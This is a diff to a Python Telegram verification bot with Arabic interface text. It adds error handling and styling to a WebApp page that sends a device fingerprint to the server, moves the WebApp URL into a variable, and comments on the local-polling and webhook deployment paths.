@@ -30,7 +30,7 @@ def init_db():
 
 init_db()
 
-# ================= قالب صفحة التوثيق =================
+# ================= قالب صفحة التوثيق (مُحسن) =================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -81,6 +81,10 @@ HTML_TEMPLATE = """
             -webkit-text-fill-color: #22c55e; 
             text-shadow: 0 0 10px rgba(34, 197, 94, 0.4);
         }
+        .error-mode h2 {
+            -webkit-text-fill-color: #ef4444;
+            text-shadow: 0 0 10px rgba(239, 68, 68, 0.4);
+        }
     </style>
 </head>
 <body>
@@ -113,13 +117,21 @@ HTML_TEMPLATE = """
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify(fp)
-            }).then(response => response.json())
-              .then(data => {
+            })
+            .then(response => response.json())
+            .then(data => {
                 document.body.classList.add("success-mode");
                 document.getElementById("spinner").style.display = "none";
                 document.getElementById("status").innerHTML = "✅ تم التوثيق بنجاح!";
                 document.getElementById("sub-status").innerHTML = "تم إرسال بياناتك للفحص، يمكنك العودة الآن.";
                 setTimeout(() => { tg.close(); }, 2500);
+            })
+            .catch(error => {
+                document.body.classList.add("error-mode");
+                document.getElementById("spinner").style.display = "none";
+                document.getElementById("status").innerHTML = "❌ حدث خطأ أثناء التوثيق";
+                document.getElementById("sub-status").innerHTML = "يرجى المحاولة مرة أخرى لاحقاً.";
+                setTimeout(() => { tg.close(); }, 3000);
             });
         }
 
@@ -271,8 +283,10 @@ def handle_contact(message):
     conn.commit()
     conn.close()
     
+    # إنشاء زر WebApp
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("🔐 دخول بوابة التوثيق الآمن", web_app=WebAppInfo(url=f"{DOMAIN}/verify/{user_id}")))
+    web_app_url = f"{DOMAIN}/verify/{user_id}"
+    markup.add(InlineKeyboardButton("🔐 دخول بوابة التوثيق الآمن", web_app=WebAppInfo(url=web_app_url)))
     
     bot.send_message(user_id, "✅ تم تسجيل رقم الهاتف.\n\nالآن اضغط على الزر بالأسفل لتوثيق جهازك بالكامل داخل التليجرام:", reply_markup=markup)
 
@@ -313,9 +327,10 @@ def set_webhook():
 
 # ================= نقطة الدخول =================
 if __name__ == '__main__':
-    # للتشغيل المحلي
+    # للتشغيل المحلي (polling)
     print("Running locally with polling...")
     bot.remove_webhook()
     bot.infinity_polling(skip_pending=True)
 else:
+    # عند التشغيل عبر gunicorn (على Railway)
     set_webhook()
